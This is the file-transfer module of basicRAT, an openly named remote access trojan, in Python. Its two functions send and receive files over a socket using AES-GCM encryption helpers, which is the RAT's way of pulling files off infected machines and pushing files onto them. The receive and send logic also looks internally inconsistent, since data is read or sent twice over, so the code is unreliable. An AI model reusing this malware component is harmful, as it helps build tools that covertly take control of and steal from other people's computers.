# -*- coding: utf-8 -*-

#
# basicRAT filesock module
# https://github.com/vesche/basicRAT
#

import socket
import struct

from crypto import sendGCM
from crypto import recvGCM


# recieve a file from a socket
def recvfile(sock, GCM_obj, fname):
    with open(fname, 'wb') as f:
        datasize = struct.unpack("!I", sock.recv(4))[0]
        while datasize:
            res = sock.recv(datasize)
            f.write(recvGCM(sock, GCM_obj))
            datasize = struct.unpack("!I", sock.recv(4))[0]


# send a file over a socket
def sendfile(sock, GCM_obj, IV, fname):
    with open(fname, 'rb') as f:
        res = f.read(4096)
        while len(res):
            enc_res = sendGCM(sock, GCM_obj, IV, res)
            sock.send(struct.pack("!I", len(enc_res)))
            sock.send(enc_res)
            res = f.read(4096)
        sock.send('\x00\x00\x00\x00') # EOF
